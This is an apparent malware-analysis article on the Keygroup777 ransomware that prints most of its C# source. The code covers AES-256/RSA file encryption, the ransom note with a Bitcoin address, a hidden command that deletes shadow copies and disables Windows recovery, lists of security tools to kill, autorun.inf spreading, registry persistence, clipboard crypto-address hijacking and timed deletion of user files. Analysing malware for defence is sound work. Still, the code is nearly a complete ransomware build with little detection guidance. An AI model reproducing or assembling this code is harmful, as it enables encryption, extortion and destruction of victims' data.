# 🛠️ Analyzing the Keygroup777 Ransomware: A Deep Dive into Malicious Code

Ransomware remains one of the most devastating types of malware, encrypting victims' files and demanding payment for decryption. The `Keygroup777` ransomware is a sophisticated example, written in C# and designed to encrypt files, disrupt system recovery, and persist on infected machines. In this article, we’ll dissect its core functionalities, explore its encryption mechanisms, and highlight its malicious behaviors, with complete code snippets for each point. Let’s dive into the code and understand how this ransomware operates.

---

## 📜 1. Overview of the Ransomware

The `Keygroup777` ransomware targets a wide range of file extensions (271 in total), encrypts them using AES and RSA algorithms, and appends a custom extension (`.keygroup777Rezerv1`). It drops a ransom note (`keygroup.txt`), changes the desktop wallpaper, kills specific processes, and attempts to disable system recovery mechanisms. The program also ensures persistence by modifying the Windows Registry and copying itself to critical locations.

Here’s the entry point of the program, the `Main` method, which orchestrates its malicious activities:

```csharp
private static void Main(string[] args)
{
    if (CHANGE_PROCESS_NAME != "")
    {
        COPY_FILE(CHANGE_PROCESS_NAME);
    }
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo drive in drives)
    {
        Task task = Task.Factory.StartNew(delegate
        {
            if (ENCRYPT_EXTENSIONS)
            {
                LOOK_FOR_EXTENSIONS(drive.ToString());
            }
            else
            {
                LOOK_FOR_EXCEPTIONS(drive.ToString());
            }
        });
        task.Wait();
        UAC();
        Infect();
        ProcessKill();
        ProcessKill1();
        STARTUP1();
        COPY_FILE1();
    }
    DRAW_WALLPAPER(WALLPAPER_MESSAGE);
    KILL_APPS_ENCRYPT_AGAIN();
    STARTUP();
    FOR_ALL = AES_SALT(RANDOM_VALUE, SALT_ALL);
    FOR_TRIPLE = AES_SALT(RANDOM_VALUE, SALT_TRIPLE);
    if (CHECK_REGEDIT())
    {
        KEEP_RUNNING();
    }
}
```

This method iterates through all drives, encrypts files, disables User Account Control (UAC), kills processes, sets up persistence, and modifies the clipboard to replace cryptocurrency addresses. Let’s break down the key components.

---

## 🔒 2. File Encryption Mechanism

### 🛡️ Targeting Files

The ransomware targets an extensive list of 271 file extensions, including documents (`.docx`, `.pdf`), images (`.jpg`, `.png`), and code files (`.cs`, `.java`). The `TARGETED_EXTENSIONS` array defines these:

```csharp
private static string[] TARGETED_EXTENSIONS = new string[271]
{
    ".myd", ".ndf", ".qry", ".sdb", ".sdf", ".tmd", ".tgz", ".lzo", ".txt", ".jar",
    ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
    // ... (additional extensions)
    ".exe"
};
```

### 🔐 Encryption Process

The ransomware uses two encryption methods:
- **Full Encryption (`FULL_ENCRYPT`)**: For files smaller than 512 KB, it encrypts the entire file using AES-256 in CBC mode.
- **Partial Encryption (`TRIPLE_ENCRYPT`)**: For larger files, it encrypts three 128 KB chunks (beginning, middle, and end) to optimize performance.

Here’s the `FULL_ENCRYPT` method, which encrypts a file completely:

```csharp
private static void FULL_ENCRYPT(string filePath)
{
    byte[] array = File.ReadAllBytes(filePath);
    string text = RANDOM_STRING(32);
    string text2 = RANDOM_STRING(16);
    byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
    RSA_KEY_IV = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
    {
        fileStream.SetLength(0L);
        byte[] array2 = null;
        using (MemoryStream memoryStream = new MemoryStream())
        {
            using RijndaelManaged rijndaelManaged = new RijndaelManaged();
            rijndaelManaged.KeySize = 256;
            rijndaelManaged.BlockSize = 128;
            rijndaelManaged.Key = Encoding.ASCII.GetBytes(text);
            rijndaelManaged.IV = Encoding.ASCII.GetBytes(text2);
            rijndaelManaged.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(array, 0, array.Length);
            }
            array2 = memoryStream.ToArray();
        }
        fileStream.Write(array2, 0, array2.Length);
    }
    using FileStream fileStream2 = new FileStream(filePath, FileMode.Append, FileAccess.Write);
    fileStream2.Write(RSA_KEY_IV, 0, RSA_KEY_IV.Length);
}
```

This method:
1. Generates random AES key (32 bytes) and IV (16 bytes).
2. Encrypts the key and IV using RSA with a public key.
3. Encrypts the file content using AES-256 in CBC mode.
4. Appends the RSA-encrypted key and IV to the file.

The `TRIPLE_ENCRYPT` method, used for larger files, is similar but encrypts only specific chunks:

```csharp
private static void TRIPLE_ENCRYPT(string filePath, int length, int beginning, long middle, long end)
{
    string text = RANDOM_STRING(32);
    string text2 = RANDOM_STRING(16);
    byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
    RSA_KEY_IV = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
    {
        fileStream.Position = beginning;
        byte[] array = new byte[length];
        fileStream.Read(array, 0, length);
        byte[] array2 = ENCRYPT_DATA(text, text2, array);
        fileStream.Position = beginning;
        fileStream.Write(array2, 0, array2.Length);
        fileStream.Position = middle;
        byte[] array3 = new byte[length];
        fileStream.Read(array3, 0, length);
        byte[] array4 = ENCRYPT_DATA(text, text2, array3);
        fileStream.Position = middle;
        fileStream.Write(array4, 0, array4.Length);
        fileStream.Position = end;
        byte[] array5 = new byte[length];
        fileStream.Read(array5, 0, length);
        byte[] array6 = ENCRYPT_DATA(text, text2, array5);
        fileStream.Position = end;
        fileStream.Write(array6, 0, array6.Length);
    }
    using FileStream fileStream2 = new FileStream(filePath, FileMode.Append, FileAccess.Write);
    fileStream2.Write(RSA_KEY_IV, 0, RSA_KEY_IV.Length);
}
```

After encryption, files are renamed with the `.keygroup777Rezerv1` extension.

---

## 📢 3. Ransom Note and Wallpaper

### 📝 Dropping the Ransom Note

The ransomware creates a file named `keygroup.txt` in each directory containing encrypted files. The note demands a $300 Bitcoin payment and provides instructions:

```csharp
private static readonly string TEXT_MESSAGE = "You became victim of the keygroup777 RANSOMWARE!" + Environment.NewLine + 
    "The files on your computer have been encrypted with an military grade encryption algorithm. There is no way to" + Environment.NewLine + 
    "restore your data without a special key. You can purchase this key on the telegram page shown in step 2." + Environment.NewLine + 
    "To purchase your key and restore your data, please follow these three easy steps:" + Environment.NewLine + 
    "register a bitcoin 300$ @keygroup777Rezerv1 3CcQvqAXWZf1wUThRVaxgo35WZjcjWm5Dc." + Environment.NewLine + 
    "2. register a bitcoin wallet :" + Environment.NewLine + 
    "https://bitcoin-wallet.org/ru/" + Environment.NewLine + 
    "https://bitcoin-wallet.org/ru/" + Environment.NewLine + 
    "3. Enter your personal decryption code there:" + Environment.NewLine + 
    "e5Pc4P8WjF35" + Environment.NewLine;
```

The note is written to disk in the `LOOK_FOR_EXTENSIONS` method:

```csharp
if (flag)
{
    flag = false;
    string path2 = path + "/" + MESSAGE_FILE;
    if (!File.Exists(path2))
    {
        File.WriteAllText(path2, TEXT_MESSAGE);
    }
}
```

### 🖼️ Modifying the Desktop Wallpaper

The ransomware changes the desktop wallpaper to display a threatening message using the `DRAW_WALLPAPER` method:

```csharp
public static void DRAW_WALLPAPER(string[] lines)
{
    Rectangle bounds = Screen.PrimaryScreen.Bounds;
    int width = bounds.Width;
    int height = bounds.Height;
    Bitmap val = new Bitmap(width, height);
    Graphics val2 = Graphics.FromImage((Image)(object)val);
    try
    {
        val2.Clear(ColorTranslator.FromHtml("Black"));
        Font val3 = new Font("Arial", 36f, (FontStyle)1);
        SolidBrush val4 = new SolidBrush(ColorTranslator.FromHtml("White"));
        StringFormat val5 = new StringFormat();
        val5.Alignment = (StringAlignment)1;
        val5.LineAlignment = (StringAlignment)1;
        int num = (int)(val3.GetHeight() + 5f);
        int num2 = height / 2 - lines.Length / 2 * num;
        foreach (string text in lines)
        {
            val2.DrawString(text, val3, (Brush)(object)val4, new RectangleF(0f, num2, width, num), val5);
            num2 += num;
        }
    }
    finally
    {
        ((IDisposable)val2)?.Dispose();
    }
    string text2 = Path.GetTempPath() + RANDOM_STRING(9) + ".jpg";
    ((Image)val).Save(text2, ImageFormat.Jpeg);
    SystemParametersInfo(20u, 0u, text2, 3u);
}
```

This method creates a black bitmap with white text, saves it as a JPEG, and sets it as the wallpaper using the `SystemParametersInfo` API.

---

## 🚫 4. Disabling System Recovery

The ransomware takes steps to prevent recovery by deleting Volume Shadow Copies and disabling Windows recovery options. The `COPY_FILE1` method executes a command to achieve this:

```csharp
private static void COPY_FILE1()
{
    Process.Start(new ProcessStartInfo
    {
        FileName = "cmd.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        Arguments = "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet"
    });
}
```

This command:
- Deletes all shadow copies (`vssadmin delete shadows`).
- Removes shadow copies via WMI (`wmic shadowcopy delete`).
- Disables boot failure recovery (`bcdedit /set {default} bootstatuspolicy ignoreallfailures`).
- Disables Windows recovery (`bcdedit /set {default} recoveryenabled no`).
- Deletes the Windows Backup catalog (`wbadmin delete catalog`).

---

## 🕵️ 5. Process Termination

The ransomware terminates processes that could interfere with its operation, such as debuggers, antivirus software, and virtualization tools. The `processesToKill` array lists these targets:

```csharp
private static readonly string[] processesToKill = new string[31]
{
    "procexp", "SbieCtrl", "SpyTheSpy", "wireshark", "apateDNS", "IPBlocker", "TiGeR-Firewall", "smsniff", "exeinfoPE", "NetSnifferCs",
    "Sandboxie Control", "processhacker", "dnSpy", "CodeReflect", "Reflector", "ILSpy", "VGAuthService", "VBoxService", "msconfig", "regedit",
    "cmd", "taskmgr", "ShadowExplorer", "rstrui", "ShadowExplorerPortable", "SpyHunter-Installer", "SpyHunter", "MRT", "die", "WindowsSandbox",
    "WindowsSandboxClient"
};
```

The `ProcessKill1` method terminates these processes:

```csharp
public static void ProcessKill1()
{
    string[] array = processesToKill;
    foreach (string processName in array)
    {
        try
        {
            Process[] processesByName = Process.GetProcessesByName(processName);
            Process[] array2 = processesByName;
            foreach (Process process in array2)
            {
                process.Kill();
            }
        }
        catch (Exception)
        {
        }
    }
}
```

Additionally, the `KILL_APPS_ENCRYPT_AGAIN` method terminates more processes and re-encrypts files:

```csharp
private static void KILL_APPS_ENCRYPT_AGAIN()
{
    string[] array = new string[50]
    {
        "sqlwriter", "sqbcoreservice", "VirtualBoxVM", "sqlagent", "sqlbrowser", "sqlservr", "code", "steam", "zoolz", "agntsvc",
        // ... (additional processes)
        "mbamtray"
    };
    string[] array2 = array;
    foreach (string processName in array2)
    {
        Process[] processesByName = Process.GetProcessesByName(processName);
        foreach (Process process in processesByName)
        {
            process.CloseMainWindow();
        }
    }
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo drive in drives)
    {
        Task task = Task.Factory.StartNew(delegate
        {
            if (ENCRYPT_EXTENSIONS)
            {
                LOOK_FOR_EXTENSIONS(drive.ToString());
            }
            else
            {
                LOOK_FOR_EXCEPTIONS(drive.ToString());
            }
        });
        task.Wait();
    }
}
```

---

## 🔄 6. Persistence Mechanisms

The ransomware ensures it runs on system startup and copies itself to critical locations.

### 📂 File Copying

The `UAC` method copies the executable to `C:\Windows`:

```csharp
private static void UAC()
{
    string location = Assembly.GetExecutingAssembly().Location;
    string destFileName = "C:/Windows/" + Path.GetFileName(location);
    File.Copy(location, destFileName, overwrite: true);
}
```

The `Infect` method creates an autorun entry on all drives:

```csharp
private static void Infect()
{
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
    string[] logicalDrives = Directory.GetLogicalDrives();
    string[] array = logicalDrives;
    foreach (string path in array)
    {
        try
        {
            File.Copy(Application.ExecutablePath, Path.Combine(path, "keygroup777.flv.pif"));
            using (StreamWriter streamWriter = new StreamWriter(Path.Combine(path, "autorun.inf")))
            {
                streamWriter.WriteLine("[autorun]");
                streamWriter.WriteLine("open=keygroup777.flv.pif");
                streamWriter.WriteLine("shellexecute=keygroup777.flv.pif");
            }
            File.SetAttributes(Path.Combine(path, "autorun.inf"), FileAttributes.Hidden);
            File.SetAttributes(Path.Combine(path, "keygroup777.flv.pif"), FileAttributes.Hidden);
        }
        catch (Exception)
        {
        }
    }
}
```

### 🗝️ Registry Modification

The `STARTUP` method adds the ransomware to the Windows Registry for automatic execution:

```csharp
private static void STARTUP()
{
    string location = Assembly.GetExecutingAssembly().Location;
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
    registryKey.SetValue(MESSAGE_FILE.Split(new char[1] { '.' })[0], location);
    registryKey.Close();
}
```

---

## 💸 7. Clipboard Hijacking

The ransomware monitors the clipboard for Bitcoin addresses and replaces them with its own, a technique to intercept payments. The `KEEP_RUNNING` method runs an infinite loop to achieve this:

```csharp
private static void KEEP_RUNNING()
{
    while (true)
    {
        SET_TEXT(GET_TEXT());
        Thread.Sleep(700);
    }
}
```

The `GET_TEXT` method retrieves and modifies clipboard content:

```csharp
private static string GET_TEXT()
{
    string ReturnValue = string.Empty;
    try
    {
        Thread thread = new Thread((ThreadStart)delegate
        {
            ReturnValue = Clipboard.GetText();
        });
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
        thread.Join();
    }
    catch
    {
    }
    Regex regex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
    if (ReturnValue.StartsWith("bc1"))
    {
        return regex.Replace(ReturnValue, FOR_TRIPLE);
    }
    return regex.Replace(ReturnValue, FOR_ALL);
}
```

---

## ⏰ 8. Periodic File Deletion

The ransomware sets a timer to delete files in specific directories (e.g., Desktop, Downloads) every two hours:

```csharp
private static void STARTUP1()
{
    System.Timers.Timer timer = new System.Timers.Timer(7200000.0);
    timer.Elapsed += DeleteFiles;
    timer.AutoReset = true;
    timer.Start();
}

private static void DeleteFiles(object sender, ElapsedEventArgs e)
{
    string[] array = new string[11]
    {
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
        // ... (additional directories)
        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
    };
    string[] array2 = array;
    foreach (string path in array2)
    {
        try
        {
            if (Directory.Exists(path))
            {
                string[] files = Directory.GetFiles(path);
                string[] array3 = files;
                foreach (string path2 in array3)
                {
                    File.Delete(path2);
                }
            }
        }
        catch (Exception)
        {
        }
    }
}
```

---

## 🛑 9. Conclusion

The `Keygroup777` ransomware is a highly destructive piece of malware that combines advanced encryption, system disruption, and persistence techniques. Its use of AES and RSA encryption ensures that files are inaccessible without the attacker’s private key, while its anti-recovery and process-killing mechanisms make mitigation challenging. Understanding such code is crucial for cybersecurity professionals to develop effective defenses.